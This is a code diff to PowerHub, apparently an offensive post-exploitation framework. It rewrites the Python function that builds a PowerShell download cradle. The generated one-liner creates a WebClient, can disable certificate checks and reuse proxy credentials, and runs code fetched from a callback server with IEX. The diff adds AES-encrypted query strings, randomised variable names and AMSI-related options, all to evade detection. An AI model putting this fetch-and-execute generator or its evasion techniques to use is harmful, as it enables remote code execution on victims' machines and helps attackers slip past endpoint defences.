@@ -6,6 +6,8 @@ import magic
 
 from powerhub.env import powerhub_app as ph_app
 from powerhub.directories import MOD_DIR
+from powerhub.obfuscation import symbol_name
+from powerhub.tools import encrypt_aes
 
 log = logging.getLogger(__name__)
 
@@ -134,8 +136,9 @@ webdav_url = 'http://%s:%d/webdav' % (
 )
 
 
-def build_cradle(get_args):
-    result = ""
+def build_crade_https(get_args):
+    result = ''
+
     if get_args['Transport'] == 'https':
         if get_args['NoVerification'] == 'true':
             result += ("[System.Net.ServicePointManager]::ServerCertificate"
@@ -152,34 +155,65 @@ def build_cradle(get_args):
             result += ("[Net.ServicePointManager]::SecurityProtocol="
                        "[Net.SecurityProtocolType]::Tls12;")
 
+    return result
+
+
+def build_cradle_webclient(get_args, key):
+    result = ''
+    web_client = symbol_name('web_client')
+
     if get_args['Transport'].startswith('http'):
-        result += "$K=New-Object Net.WebClient;"
+        result += "$%(web_client)s=New-Object Net.WebClient;"
+
         if get_args['Proxy'] == 'true':
-            result += ("$K.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
-                       "$K.Proxy.Credentials=[Net.CredentialCache]::"
+            result += ("$%(web_client)s.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
+                       "$%(web_client)s.Proxy.Credentials=[Net.CredentialCache]::"
                        "DefaultCredentials;")
+
+        url = callback_urls[get_args['Transport']]
+        query = "/?t=%(Transport)s&a=%(Amsi)s&k=%(KEX)s" % get_args
         if not get_args['ClipExec'] == 'none':
-            clip_exec = "&c=%s" % get_args['ClipExec']
-        else:
-            clip_exec = ""
-        if get_args['SeparateAMSI'] == 'true':
-            result += (
-                "'a=%(amsi)s','t=%(transport)s%(clip)s'|%%"
-                "{IEX $K.DownloadString('%(url)s0?'+$_)}"
-            )
-        else:
-            result += (
-                "IEX $K.DownloadString('%(url)s0?t=%(transport)s&a=%(amsi)s"
-                "%(clip)s')"
-            )
+            query += "&c=%(ClipExec)s" % get_args['ClipExec']
+        query = encrypt_aes(query, key)
+        # Make b64 encoding urlsafe
+        query = query.replace('/', '_').replace('+', '-')
+
+        result += "IEX $%(web_client)s.DownloadString('%(url)s%(query)s')"
         result = result % dict(
-            url=callback_urls[get_args['Transport']],
-            transport=get_args['Transport'],
-            amsi=get_args['Amsi'],
-            clip=clip_exec,
+            url=url,
+            query=query,
+            web_client=web_client,
         )
 
-    powershell_exe = 'powershell.exe -v 2'
+    return result
+
+
+def build_cradle(get_args, key):
+    """Build the download crade given a dict of GET arguments"""
+
+    result = ""
+    key_var = symbol_name('global_key')
+
+    result += build_crade_https(get_args)
+
+    if get_args['KEX'] == 'oob' and key:
+        result += "$%(key_var)s='%(key)s';"
+
+    result += build_cradle_webclient(get_args, key)
+
+    result = result % dict(
+        url=callback_urls[get_args['Transport']],
+        transport=get_args['Transport'],
+        amsi=get_args['Amsi'],
+        key_var=key_var,
+        key=key,
+    )
+
+    # make sure to only use single quotes
+    assert '"' not in result
+
+    powershell_exe = 'powershell.exe'
+
     if get_args['Launcher'] == 'cmd':
         result = '%s "%s"' % (powershell_exe, result)
     elif get_args['Launcher'] == 'cmd_enc':
@@ -189,4 +223,5 @@ def build_cradle(get_args):
     elif get_args['Launcher'] == 'bash':
         result = result.replace('$', '\\$')
         result = '"%s \\\"%s\\\""' % (powershell_exe, result)
+
     return result
